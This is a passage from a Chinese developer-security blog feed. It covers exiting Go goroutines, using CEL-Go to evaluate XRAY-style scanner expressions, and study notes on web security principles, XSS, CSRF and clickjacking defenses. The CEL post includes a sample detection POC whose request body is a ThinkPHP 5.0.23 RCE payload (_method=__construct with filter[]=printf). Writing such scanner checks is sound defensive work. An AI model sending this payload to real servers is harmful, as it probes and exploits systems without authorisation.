         <span class="k">if</span> <span class="o">!</span><span class="n">ok</span> <span class="p">{</span>
            <span class="n">in2</span> <span class="o">=</span> <span class="no">nil</span>
         <span class="p">}</span>
      <span class="k">if</span> <span class="n">in1</span> <span class="o">==</span> <span class="no">nil</span> <span class="o">&amp;&amp;</span> <span class="n">in2</span> <span class="o">==</span> <span class="no">nil</span> <span class="p">{</span>
         <span class="k">return</span>
      <span class="p">}</span>
   <span class="p">}</span>
<span class="p">}()</span>
</code></pre></div></div>

<h3 id="使用专门通道退出协程">使用专门通道退出协程</h3>

<p>这里传入了一个专门的channel<code class="language-plaintext highlighter-rouge">stopCh</code>,当main函数执行close(stopCh)时，所有协程里的<code class="language-plaintext highlighter-rouge">case &lt;-stopCh</code>都会收到信号，进而关闭，这比给stopCh发送多个数据方便多了</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">func</span> <span class="n">worker</span><span class="p">(</span><span class="n">stopCh</span> <span class="o">&lt;-</span><span class="k">chan</span> <span class="k">struct</span><span class="p">{})</span> <span class="p">{</span>
   <span class="k">go</span> <span class="k">func</span><span class="p">()</span> <span class="p">{</span>
      <span class="k">defer</span> <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"worker exit"</span><span class="p">)</span>
      <span class="c">// Using stop channel explicit exit</span>
      <span class="k">for</span> <span class="p">{</span>
         <span class="k">select</span> <span class="p">{</span>
         <span class="k">case</span> <span class="o">&lt;-</span><span class="n">stopCh</span><span class="o">:</span>
            <span class="n">log</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"Recv stop signal"</span><span class="p">)</span>
            <span class="k">return</span>
         <span class="k">default</span><span class="o">:</span>
            <span class="n">log</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"running"</span><span class="p">)</span>
            <span class="n">time</span><span class="o">.</span><span class="n">Sleep</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">Second</span><span class="p">)</span>
         <span class="p">}</span>
      <span class="p">}</span>
   <span class="p">}()</span>
   <span class="k">return</span>
<span class="p">}</span>
<span class="k">func</span> <span class="n">main</span><span class="p">(){</span>
   <span class="n">stopCh</span><span class="o">:=</span><span class="nb">make</span><span class="p">(</span><span class="k">chan</span> <span class="k">struct</span><span class="p">{})</span>
   <span class="k">go</span> <span class="n">worker</span><span class="p">(</span><span class="n">stopCh</span><span class="p">)</span>
   <span class="k">go</span> <span class="n">worker</span><span class="p">(</span><span class="n">stopCh</span><span class="p">)</span>
   <span class="k">go</span> <span class="n">worker</span><span class="p">(</span><span class="n">stopCh</span><span class="p">)</span>
   <span class="n">time</span><span class="o">.</span><span class="n">Sleep</span><span class="p">((</span><span class="n">time</span><span class="o">.</span><span class="n">Second</span><span class="p">)</span><span class="o">*</span><span class="m">2</span><span class="p">)</span>
   <span class="nb">close</span><span class="p">(</span><span class="n">stopCh</span><span class="p">)</span>
   <span class="n">time</span><span class="o">.</span><span class="n">Sleep</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">Second</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></div></div>

<h2 id="reference">Reference</h2>

<ul>
  <li>https://www.topgoer.com/%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/channel.html</li>
  <li>https://studygolang.com/articles/16774</li>
</ul>

<h2 id="写在最后">写在最后</h2>

<p>说一个很有意思的事情，笔者曾在去年寒假认认真真学了两个月go，原因呢，主要还是想要<del>专精</del>于一门语言吧。c++大一留下了很不好的印象，php动态类型不太能接受，最后选择了golang。学习路线大概是：</p>

<ol>
  <li>
    <p><a href="https://books.studygolang.com/gopl-zh/">Go语言圣经</a> 这本书的评价相当高，我也首先选择了这本，大概在是异常的时候放弃了，感觉这本书的例子很有高度，但不太适合初学者，更像是有一定经验的gopher日常回味的感觉。</p>
  </li>
  <li>
    <p><a href="https://github.com/unknwon/the-way-to-go_ZH_CN/blob/master/eBook/directory.md">the way to go </a>后来加了一个go语言学习群，在里面有师傅推荐了这一本书，然后就顺着一点一点看，看到并发那一章的时候，卡住了…可能是思想上没能转变过来，最后无意间搜到了一本非常通俗易懂的书</p>
  </li>
  <li>
    <p><a href="https://www.topgoer.com/%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E5%B9%B6%E5%8F%91%E4%BB%8B%E7%BB%8D.html">Go语言中文文档</a> 准确来说这并不是一本书，是一个叫枯藤的go语言爱好者结合前人的资料，总结下来的一份非常全面的文档，后续的学习也基本上是在这个的基础上，不过寒假的学习基本上到gin就结束了，rpc什么的都是后续回学校有的没的看一些。还有收集一些非常好的资料，但是都甚至没能深入看看。</p>
  </li>
  <li>
    <p><a href="https://chai2010.cn/advanced-go-programming-book/">Go语言高级编程</a> 这本书的需要一定的基础，从目录-&gt;<code class="language-plaintext highlighter-rouge">CGO</code>,<code class="language-plaintext highlighter-rouge">汇编</code>,<code class="language-plaintext highlighter-rouge">RPC</code>等等也能看出来</p>
  </li>
  <li>
    <p><a href="https://github.com/astaxie/build-web-application-with-golang">build-web-application-with-golang</a> 主要是web方面，也是评价很高</p>
  </li>
  <li>
    <p><a href="https://draveness.me/golang/">Go 语言设计与实现</a> 刚刚点开的时候发现出书了！！！必须支持！！信仰师傅是某天操作系统课上，骏哥推给我的。如果真要对标一本其他的书的话，这本书在go上的定位可能和《深入了解java虚拟机》在java上一样。(不过我只看了基础知识和编译原理部分)</p>
  </li>
</ol>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/12/20211203181902.png" alt="contents-mindnode" /></p>

<p>但是我想说的是什么呢，之前和骏哥聊天，说想学一门语言。我的习惯是在知乎，豆瓣看各种推荐，书评，然后罗列一大堆，再<strong>精挑细选</strong>一本慢慢看。骏哥呢？一个字，<code class="language-plaintext highlighter-rouge">调</code>。go？并发好像是优势，直接上手写，不会的就看官方文档。java？直接编译jdk，开调。solidity？编译evm虚拟机，开调。</p>

<p>这就导致了一点，我好像永远停留在语言的层面上，并为之此乐此不疲，但也只是一些皮毛功夫。语言只是工具，项目驱动学习效果会更好一些。比如学习springboot，比起上来就依赖注入，控制反转等概念的介绍，不如先抄或者直接照搬一个别人的代码跑起来，断点看看数据的流向，有问题再逐个学习。</p>

<p>这样来看，新人学习的确很容易进入一个误区，就是想办法让自己学的全面，各种铺路，实话说到现在我也还没能改掉这个毛病。我们得明白学这门语言是为了什么，大多时候毫无意义的准备都是因为迷茫，如果你是为了想写扫描器学go，那不如了解一些基础语法后，马上上手项目。我感觉这是有一些本末倒置了,书籍还是适合在有一些经验的基础上，作为一种内功提升的工具，让你看完后感觉：<code class="language-plaintext highlighter-rouge">居然还能这样?我之前的写法真是nt</code>。该踩的坑还是要踩的，学习之路漫漫无期…</p>]]></content><author><name>Theoyu</name><email>zeyu.ou@foxmail.com</email></author><summary type="html"><![CDATA[前言 作为世界上除了PHP之外最好的语言golang，只需go关键字修饰函数，就可以直接启动一个goroutine(协程)运行，但在实际的场景中，我们需要考虑到协程的数量，其之间的同步与通信，以及精确控制其结束。]]></summary></entry><entry><title type="html">Preliminary Study on CEL-Go</title><link href="http://localhost:4000/2021/10/26/CEL-Go.html" rel="alternate" type="text/html" title="Preliminary Study on CEL-Go" /><published>2021-10-26T23:24:32+08:00</published><updated>2021-10-26T23:24:32+08:00</updated><id>http://localhost:4000/2021/10/26/CEL-Go</id><content type="html" xml:base="http://localhost:4000/2021/10/26/CEL-Go.html"><![CDATA[<h2 id="前言">前言</h2>

<p>XRAY很牛逼，但是其不开源，最近也是想写点东西，就自己也造个轮子，有时间的话就把<strong>Thinkphp，structs2，weblogic</strong>都整上了。</p>

<!--more-->

<p>poc的话当然希望可以直接融合XRAY的poc，采用YAML格式，但有一个问题，比如我们一般用<code class="language-plaintext highlighter-rouge">gopkg.in/yaml.v2</code>把YAML解析为结构体，但如果YAML中出现一些表达式，就很难直接用结构体解决。(无脑正则当然ok)</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">name</span><span class="pi">:</span> <span class="s">poc-yaml-thinkphp5023-method-rce</span>
<span class="na">rules</span><span class="pi">:</span>
  <span class="pi">-</span> <span class="na">method</span><span class="pi">:</span> <span class="s">POST</span>
    <span class="na">path</span><span class="pi">:</span> <span class="s">/index.php?s=captcha</span>
    <span class="na">headers</span><span class="pi">:</span>
      <span class="na">Content-Type</span><span class="pi">:</span> <span class="s">application/x-www-form-urlencoded</span>
    <span class="na">body</span><span class="pi">:</span> <span class="pi">|</span>
      <span class="s">_method=__construct&amp;filter[]=printf&amp;method=GET&amp;server[REQUEST_METHOD]=TmlnaHQgZ2F0aGVycywgYW5%25%25kIG5vdyBteSB3YXRjaCBiZWdpbnMu&amp;get[]=1</span>
    <span class="na">expression</span><span class="pi">:</span> <span class="pi">|</span>
      <span class="s">response.status==200&amp;&amp;response.body.bcontains(b"TmlnaHQgZ2F0aGVycywgYW5%kIG5vdyBteSB3YXRjaCBiZWdpbnMu1")</span>
<span class="na">detail</span><span class="pi">:</span>
  <span class="na">links</span><span class="pi">:</span>
    <span class="pi">-</span> <span class="s">https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce</span>
</code></pre></div></div>

<p>上面的<code class="language-plaintext highlighter-rouge">expression</code>其实很好理解，长得比较像python表达式，在python中eval可以直接对表达式求解，而我们现在也就需要一个高效的方法可以自定义求解表达式。</p>

<p>在<a href="https://docs.xray.cool/#/guide/poc?id=%e5%a6%82%e4%bd%95%e7%bc%96%e5%86%99expression%e8%a1%a8%e8%be%be%e5%bc%8f">XRAY-如何编写expression表达式</a>中其实有提到一个库 ==&gt; <a href="https://github.com/google/cel-go">CEL-Go</a>,官网介绍看了半天说实话不知道在干嘛…查了查国内这方面的教程也几乎为0，不过好在Google大爹的<a href="https://codelabs.developers.google.com/codelabs/cel-go/#0">codelabs</a>实在良心，自己也跟着过一遍，算是入了个门，在这简单记录一下。</p>

<h2 id="introduction">Introduction</h2>

<blockquote>
  <p>CEL是为了安全的执行用户代码而设计的一门“语言”，就像用户在Python上盲目调用<code class="language-plaintext highlighter-rouge">eval</code>是危险的，但CEL可以安全的执行。</p>

  <p>CEL多用于求解表达式，类似single line functions或者lambda表达式，并且通常用于计算bool值，但它也可用于构造更复杂的对象，如JSON或Protobuf。</p>
</blockquote>

<h2 id="key-concepts">Key concepts</h2>

<ul>
  <li>Variable bindings</li>
  <li>Function bindings for any custom extensions</li>
  <li>An AST to evaluate</li>
</ul>

<h2 id="declare-the-variables">Declare the variables</h2>

<p>cel中数据类型是绑定在protobuf上的，所以我们先简单写一个proto文件</p>

<div class="language-protobuf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">syntax</span> <span class="o">=</span> <span class="s">"proto3"</span><span class="p">;</span>
<span class="kn">package</span> <span class="nn">celDemo</span><span class="p">;</span>

<span class="k">option</span> <span class="na">go_package</span> <span class="o">=</span> <span class="s">"celDemo/bp"</span><span class="p">;</span>

<span class="kd">message</span> <span class="nc">Response</span><span class="p">{</span>
  <span class="kt">string</span> <span class="na">url</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="kt">int32</span> <span class="na">status</span> <span class="o">=</span><span class="mi">2</span><span class="p">;</span>
  <span class="kt">bytes</span> <span class="na">body</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>生成对应go文件 == &gt;<code class="language-plaintext highlighter-rouge">protoc --go_out=. celDemo/http.proto</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>celDemo
├── bp
│   └── http.pb.go
├── cel.go 
├── cel_test.go 
└── http.proto
</code></pre></div></div>
<p>cel是通过env来解析表达式，我们可以通过<code class="language-plaintext highlighter-rouge">env, err := cel.NewEnv()</code>创建一个独立的环境。</p>

<blockquote>
  <p>NewEnv creates a program environment configured with the standard library of CEL functions and macros. The Env value returned can parse and check any CEL program which builds upon the core features documented in the CEL specification.</p>
</blockquote>

<p>之前提到要想让cel识别这个Response，就需要在创建env时加入我们的options</p>

<blockquote>
  <p>The environment can be customized by providing the options cel.EnvOption to the call. Those options are able to disable macros, declare custom variables and functions, etc.</p>
</blockquote>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">type</span> <span class="n">options</span> <span class="k">struct</span> <span class="p">{</span>
	<span class="n">envOptions</span>  <span class="p">[]</span><span class="n">cel</span><span class="o">.</span><span class="n">EnvOption</span>
	<span class="n">programOptions</span>  <span class="p">[]</span><span class="n">cel</span><span class="o">.</span><span class="n">ProgramOption</span>
<span class="p">}</span>

<span class="k">func</span> <span class="n">newEnvOption</span><span class="p">()</span> <span class="o">*</span><span class="n">options</span><span class="p">{</span>
	<span class="n">opt</span><span class="o">:=</span> <span class="o">&amp;</span><span class="n">options</span><span class="p">{}</span>
	<span class="n">opt</span><span class="o">.</span><span class="n">envOptions</span> <span class="o">=</span> <span class="p">[]</span><span class="n">cel</span><span class="o">.</span><span class="n">EnvOption</span><span class="p">{</span>
		<span class="n">cel</span><span class="o">.</span><span class="n">Types</span><span class="p">(</span>
			<span class="o">&amp;</span><span class="n">bp</span><span class="o">.</span><span class="n">Response</span><span class="p">{}),</span>
		<span class="n">cel</span><span class="o">.</span><span class="n">Declarations</span><span class="p">(</span>
			<span class="n">decls</span><span class="o">.</span><span class="n">NewVar</span><span class="p">(</span><span class="s">"response"</span><span class="p">,</span>
				<span class="n">decls</span><span class="o">.</span><span class="n">NewObjectType</span><span class="p">(</span><span class="s">"celDemo.Response"</span><span class="p">)),</span>
			<span class="p">),</span>
	<span class="p">}</span>
	<span class="n">opt</span><span class="o">.</span><span class="n">programOptions</span><span class="o">=</span> <span class="p">[]</span><span class="n">cel</span><span class="o">.</span><span class="n">ProgramOption</span><span class="p">{}</span>
	<span class="k">return</span> <span class="n">opt</span>
<span class="p">}</span>
</code></pre></div></div>

<p>之后就能直接创建env</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">options</span><span class="o">:=</span> <span class="n">newEnvOption</span><span class="p">()</span>
	<span class="n">env</span><span class="p">,</span><span class="n">_</span> <span class="o">:=</span> <span class="n">cel</span><span class="o">.</span><span class="n">NewEnv</span><span class="p">(</span><span class="n">cel</span><span class="o">.</span><span class="n">Lib</span><span class="p">(</span><span class="n">options</span><span class="p">))</span>

<span class="c">//注意cel.Lib</span>
<span class="k">func</span> <span class="n">Lib</span><span class="p">(</span><span class="n">l</span> <span class="n">Library</span><span class="p">)</span> <span class="n">EnvOption</span> <span class="p">{</span>
	<span class="k">return</span> <span class="k">func</span><span class="p">(</span><span class="n">e</span> <span class="o">*</span><span class="n">Env</span><span class="p">)</span> <span class="p">(</span><span class="o">*</span><span class="n">Env</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">var</span> <span class="n">err</span> <span class="kt">error</span>
		<span class="k">for</span> <span class="n">_</span><span class="p">,</span> <span class="n">opt</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">l</span><span class="o">.</span><span class="n">CompileOptions</span><span class="p">()</span> <span class="p">{</span>
			<span class="n">e</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="n">opt</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
			<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
				<span class="k">return</span> <span class="no">nil</span><span class="p">,</span> <span class="n">err</span>
			<span class="p">}</span>
		<span class="p">}</span>
		<span class="n">e</span><span class="o">.</span><span class="n">progOpts</span> <span class="o">=</span> <span class="nb">append</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">progOpts</span><span class="p">,</span> <span class="n">l</span><span class="o">.</span><span class="n">ProgramOptions</span><span class="p">()</span><span class="o">...</span><span class="p">)</span>
		<span class="k">return</span> <span class="n">e</span><span class="p">,</span> <span class="no">nil</span>
	<span class="p">}</span>
<span class="p">}</span>

<span class="c">//发现这里调用了l.CompileOptions(),l.ProgramOptions() 所以我们需要写入options的方法中：</span>

<span class="k">func</span> <span class="p">(</span><span class="n">opt</span> <span class="o">*</span><span class="n">options</span><span class="p">)</span> <span class="n">CompileOptions</span><span class="p">()</span> <span class="p">[]</span><span class="n">cel</span><span class="o">.</span><span class="n">EnvOption</span><span class="p">{</span>
	<span class="k">return</span> <span class="n">opt</span><span class="o">.</span><span class="n">envOptions</span>
<span class="p">}</span>
<span class="k">func</span> <span class="p">(</span><span class="n">opt</span> <span class="o">*</span><span class="n">options</span><span class="p">)</span> <span class="n">ProgramOptions</span><span class="p">()</span> <span class="p">[]</span><span class="n">cel</span><span class="o">.</span><span class="n">ProgramOption</span><span class="p">{</span>
	<span class="k">return</span> <span class="n">opt</span><span class="o">.</span><span class="n">programOptions</span>
<span class="p">}</span>
</code></pre></div></div>

<p>简单测试一下：</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">celDemo</span>

<span class="k">import</span> <span class="p">(</span>
	<span class="s">"celDemo/bp"</span>
	<span class="s">"github.com/google/cel-go/cel"</span>
	<span class="s">"testing"</span>
<span class="p">)</span>

<span class="k">func</span> <span class="n">TestPoc</span><span class="p">(</span><span class="n">t</span> <span class="o">*</span><span class="n">testing</span><span class="o">.</span><span class="n">T</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">poc</span> <span class="o">:=</span> <span class="k">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="k">interface</span><span class="p">{}{}</span>

	<span class="n">poc</span><span class="p">[</span><span class="s">"response"</span><span class="p">]</span><span class="o">=</span> <span class="o">&amp;</span><span class="n">bp</span><span class="o">.</span><span class="n">Response</span><span class="p">{</span>
		<span class="n">Url</span><span class="o">:</span> <span class="s">"theoyu.top"</span><span class="p">,</span>
		<span class="n">Status</span><span class="o">:</span> <span class="m">200</span><span class="p">,</span>
		<span class="n">Body</span><span class="o">:</span> <span class="p">[]</span><span class="kt">byte</span><span class="p">(</span><span class="s">"who is theoyu"</span><span class="p">),</span>
	<span class="p">}</span>

	<span class="n">options</span><span class="o">:=</span> <span class="n">newEnvOption</span><span class="p">()</span>
	<span class="n">env</span><span class="p">,</span><span class="n">_</span> <span class="o">:=</span> <span class="n">cel</span><span class="o">.</span><span class="n">NewEnv</span><span class="p">(</span><span class="n">cel</span><span class="o">.</span><span class="n">Lib</span><span class="p">(</span><span class="n">options</span><span class="p">))</span>
	<span class="n">ast</span><span class="p">,</span><span class="n">iss</span><span class="o">:=</span><span class="n">env</span><span class="o">.</span><span class="n">Compile</span><span class="p">(</span><span class="s">"response.status == 200"</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">iss</span><span class="o">.</span><span class="n">Err</span><span class="p">()</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
		<span class="n">t</span><span class="o">.</span><span class="n">Fatal</span><span class="p">(</span><span class="n">iss</span><span class="o">.</span><span class="n">Err</span><span class="p">())</span>
	<span class="p">}</span>
	<span class="n">prg</span><span class="p">,</span><span class="n">err</span><span class="o">:=</span><span class="n">env</span><span class="o">.</span><span class="n">Program</span><span class="p">(</span><span class="n">ast</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span><span class="p">{</span>
		<span class="n">t</span><span class="o">.</span><span class="n">Fatal</span><span class="p">(</span><span class="n">err</span><span class="p">)</span>
	<span class="p">}</span>
	<span class="n">out</span><span class="p">,</span><span class="n">_</span><span class="p">,</span><span class="n">_</span><span class="o">:=</span><span class="n">prg</span><span class="o">.</span><span class="n">Eval</span><span class="p">(</span><span class="n">poc</span><span class="p">)</span>
	<span class="n">t</span><span class="o">.</span><span class="n">Log</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></div></div>

<p>输出：</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">===</span> <span class="n">RUN</span>   <span class="n">TestPoc</span>
    <span class="n">cel_test</span><span class="o">.</span><span class="k">go</span><span class="o">:</span><span class="m">29</span><span class="o">:</span> <span class="no">true</span>
<span class="o">---</span> <span class="n">PASS</span><span class="o">:</span> <span class="n">TestPoc</span> <span class="p">(</span><span class="m">0.01</span><span class="n">s</span><span class="p">)</span>
<span class="n">PASS</span>
</code></pre></div></div>

<h2 id="custom-functions">Custom Functions</h2>

<p>和变量一样，函数也在<code class="language-plaintext highlighter-rouge">EnvOption</code>中定义</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cel</span><span class="o">.</span><span class="n">Declarations</span><span class="p">(</span>
			<span class="n">decls</span><span class="o">.</span><span class="n">NewFunction</span><span class="p">(</span><span class="s">"bcontains"</span><span class="p">,</span><span class="n">decls</span><span class="o">.</span><span class="n">NewInstanceOverload</span><span class="p">(</span>
				<span class="s">"bytes_contains_bytes"</span><span class="p">,</span>
				<span class="p">[]</span><span class="o">*</span><span class="n">exprpb</span><span class="o">.</span><span class="n">Type</span><span class="p">{</span><span class="n">decls</span><span class="o">.</span><span class="n">Bytes</span><span class="p">,</span><span class="n">decls</span><span class="o">.</span><span class="n">Bytes</span><span class="p">},</span>
				<span class="n">decls</span><span class="o">.</span><span class="n">Bool</span><span class="p">)),</span>
			<span class="p">),</span>
</code></pre></div></div>

<p>实现在<code class="language-plaintext highlighter-rouge">opt.programOptions</code>中完成</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">opt</span><span class="o">.</span><span class="n">programOptions</span><span class="o">=</span> <span class="p">[]</span><span class="n">cel</span><span class="o">.</span><span class="n">ProgramOption</span><span class="p">{</span>
		<span class="n">cel</span><span class="o">.</span><span class="n">Functions</span><span class="p">(</span>
			<span class="o">&amp;</span><span class="n">functions</span><span class="o">.</span><span class="n">Overload</span><span class="p">{</span>
				<span class="n">Operator</span><span class="o">:</span>     <span class="s">"bcontains"</span><span class="p">,</span>
				<span class="n">Binary</span><span class="o">:</span> <span class="k">func</span><span class="p">(</span><span class="n">lhs</span> <span class="n">ref</span><span class="o">.</span><span class="n">Val</span><span class="p">,</span> <span class="n">rhs</span> <span class="n">ref</span><span class="o">.</span><span class="n">Val</span><span class="p">)</span> <span class="n">ref</span><span class="o">.</span><span class="n">Val</span><span class="p">{</span>
					<span class="k">return</span> <span class="n">types</span><span class="o">.</span><span class="n">Bool</span><span class="p">(</span><span class="n">bytes</span><span class="o">.</span><span class="n">Contains</span><span class="p">(</span><span class="n">lhs</span><span class="o">.</span><span class="p">(</span><span class="n">types</span><span class="o">.</span><span class="n">Bytes</span><span class="p">),</span><span class="n">rhs</span><span class="o">.</span><span class="p">(</span><span class="n">types</span><span class="o">.</span><span class="n">Bytes</span><span class="p">)))</span>
				<span class="p">},</span>
			<span class="p">},</span>
		<span class="p">),</span>
	<span class="p">}</span>
</code></pre></div></div>

<p>测试一下：</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ast</span><span class="p">,</span><span class="n">iss</span><span class="o">:=</span><span class="n">env</span><span class="o">.</span><span class="n">Compile</span><span class="p">(</span><span class="s">`response.body.bcontains(b"theoyu")`</span><span class="p">)</span>

<span class="n">output</span><span class="o">:</span>
<span class="o">===</span> <span class="n">RUN</span>   <span class="n">TestPoc</span>
    <span class="n">cel_test</span><span class="o">.</span><span class="k">go</span><span class="o">:</span><span class="m">29</span><span class="o">:</span> <span class="no">true</span>
<span class="o">---</span> <span class="n">PASS</span><span class="o">:</span> <span class="n">TestPoc</span> <span class="p">(</span><span class="m">0.01</span><span class="n">s</span><span class="p">)</span>
<span class="n">PASS</span>
</code></pre></div></div>]]></content><author><name>Theoyu</name><email>zeyu.ou@foxmail.com</email></author><summary type="html"><![CDATA[前言 XRAY很牛逼，但是其不开源，最近也是想写点东西，就自己也造个轮子，有时间的话就把Thinkphp，structs2，weblogic都整上了。]]></summary></entry><entry><title type="html">白帽子讲web安全</title><link href="http://localhost:4000/2021/10/25/whitehat-and-security.html" rel="alternate" type="text/html" title="白帽子讲web安全" /><published>2021-10-25T10:26:13+08:00</published><updated>2021-10-25T10:26:13+08:00</updated><id>http://localhost:4000/2021/10/25/whitehat-and-security</id><content type="html" xml:base="http://localhost:4000/2021/10/25/whitehat-and-security.html"><![CDATA[<p>安全工程师的核心竞争力不在于拥有多少个0day，掌握多少种安全技术，而是在于他对安全理解的深度，以及由此引申的看待安全问题的角度和高度。</p>

<p>站在白帽子的视角，除了剖析攻击原理，更加需要关注如何防范这些漏洞。</p>

<!--more-->

<h2 id="第一章-我的安全世界观">第一章 我的安全世界观</h2>

<p>数据从高等级的信任域流向低等级的信任域，是不需要经过安全检查的，反之则需要。</p>

<p><strong>安全问题的本质是信任的问题</strong>。</p>

<p>安全三要素(CIA)：</p>

<ul>
  <li><strong>机密性(Confidentiality)</strong>：数据内容不能泄漏</li>
  <li><strong>完整性(Integrity)</strong>：数据内容完成，没有被篡改 ==&gt; 数字签名</li>
  <li><strong>可用性(Availability)</strong>：拒绝服务攻击的是可用性</li>
</ul>

<p>安全评估：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. 资产等级划分
	划分信任域和信任边界
	互联网安全的核心问题，是数据安全的问题。
2. 威胁分析
	威胁建模
	书中提到的了TRIDE，不过现在ATT&amp;CK应该更加全面。
3. 风险分析
	Risk = Probability * Damage Potential
4. 确定解决方案
	有效解决问题
	用户体验好
	高性能
	低耦合
	易于拓展和升级
</code></pre></div></div>

<p>白帽子兵法：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. Secure By Default 原则：
	使用白名单优于黑名单
	最小权限原则

2. 纵深防御原则：在各个不同层次实施安全方案。

3. 数据与代码分离原则

4. 不可预测原则：
	有效对抗基于篡改，伪造的攻击。
	token防御CSRF。
</code></pre></div></div>

<h2 id="第二章-浏览器安全">第二章 浏览器安全</h2>

<p><strong>同源策略(Same origin Policy)</strong>：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>限制来自不同源的“document”或脚本，对当前“document”读取或设置某些属性。

影响“源”的因素：host、子域名、端口、协议。

页面存放文件的域并不重要，重要的是加载文件所在的域。

&lt;script&gt;、&lt;img&gt;、&lt;iframe&gt;等标签可以跨域加载资源
</code></pre></div></div>

<p>XMLHttpRequest受同源策略的约束，需要通过目标域返回的HTTP头来授权是否允许跨域访问。</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/10/20211024174040.png" alt="image-20211024174040729" /></p>

<p>对浏览器而言，除了DOM、Cookie、XMLHttpRequest受到同源策略的限制，浏览器第三方插件也有自己的同源策略（Flash、Java Applet、Google Gears）</p>

<p><strong>浏览器沙箱</strong>：</p>

<p>Sandbox的设计的目的是为了让<strong>不可信任的代码</strong>运行在一定环境中，限制不可信任的代码访问隔离区之外的资源。如果需要跨越Sandbox边界交换数据，只能通过封装的API完成。</p>

<p><strong>CSP(Content Security Policy)</strong>：</p>

<p>内容安全策略，是一个附加的安全层，有助于检测并缓解某些类型的攻击，包括跨站脚本（XSS）和数据注入攻击。</p>

<p>通过服务器端返回一个HTTP头，描述其中描述页面应该遵守的安全策略。</p>

<h2 id="第三章-跨站脚本攻击xss">第三章 跨站脚本攻击(XSS)</h2>

<ul>
  <li>
    <p><strong>反射型XSS</strong>：</p>

    <p>需要诱导用户点击恶意链接才能成功。</p>
  </li>
  <li>
    <p><strong>存储型XSS</strong>：</p>

    <p>恶意数据存储到了服务端。</p>
  </li>
  <li>
    <p><strong>DOM Based XSS</strong></p>

    <p>效果上也是反射性XSS，形成原因有所不同，通过修改页面DOM节点形成XSS。</p>
  </li>
</ul>

<p><strong>XSS防御</strong> ==&gt; 认清XSS产生的本质原因</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>XSS的本质是一种“HTML注入”，用户的数据呗当成了HTMl代码一部分来执行。

MVC架构的网站，XSS发生在View层，在拼接变量到HTML页面时产生，此时对用户提交数据进行检查的方案，并不是真正在真正发生攻击的地方防御。

HtmlEncode()
JavascriptEncode()
富文本限制白名单
......
</code></pre></div></div>

<h2 id="第四章-跨站点请求伪造csrf">第四章 跨站点请求伪造(CSRF)</h2>

<p><strong>CSRF：Cross Site Request Forgery</strong></p>

<p>主要利用了用户Cookie进行伪造操作 ==&gt; 不同浏览器的Cookie策略不同。</p>

<p>作为开发者应该在开发中主动规避而不是交给浏览器。</p>

<p><strong>防御：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. 敏感操作加上验证码

2. 敏感路由验证referer

3. SameSite头
	Set-Cookie: foo=1; SameSite=Strict
	Set-Cookie: bar=2; SameSite=Lax
	Set-Cookie: baz=3
	详细参考 https://cnblogs.com/ziyunfei/p/5637945.html
		
4. Anti CSRF Token
</code></pre></div></div>

<p><strong>CSRF攻击的本质</strong>：攻击者可以猜测重要参数的所有参数</p>

<p>真随机 ==&gt; token</p>

<p>每次刷新后，token放在Session和需要敏感操作的表单里，提交请求时，服务器验证表单中的token和用户session中token是否一致。</p>

<p>利用xss获取token再进行csrf ==&gt; <strong>XSRF</strong></p>

<h2 id="第五章-点击劫持clickjacking">第五章 点击劫持(ClickJacking)</h2>

<p>多用做🎣，🪧，欺诈</p>

<p><strong>防御：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. frame busting
	禁止iframe嵌套
2. X-Frame-Options
更多是在浏览器层面防御
</code></pre></div></div>

